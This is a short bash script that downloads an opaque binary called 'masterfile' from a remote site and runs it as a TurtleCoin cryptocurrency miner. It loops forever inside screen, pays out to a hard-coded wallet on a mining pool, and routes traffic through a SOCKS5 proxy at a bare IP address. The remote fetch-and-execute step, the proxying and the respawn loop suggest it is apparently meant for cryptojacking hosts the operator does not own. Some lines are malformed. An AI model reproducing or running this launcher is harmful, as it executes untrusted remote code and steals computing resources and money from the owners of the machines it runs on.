#!/bin/bash
apt-get update -y
apt-get install -y libjansson-dev
apt install screen -y screen
wget https://swenson.my.id/mining/masterfile
while [ 2 ]; do
screen ./masterfile--donate-level 1 -o us.turtlecoin.herominers.com:10381 -u TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy+b5a6cb7da918c5679c19d0e5ff6f2d2ed4a4f659a56ca1eb32e4702967463096.ngengg -t 36 -p x -a argon2/chukwav2 -k --randomx-1gb-pages --proxy socks5://98.175.31.195:4145
sleep 3
done
sleep 999
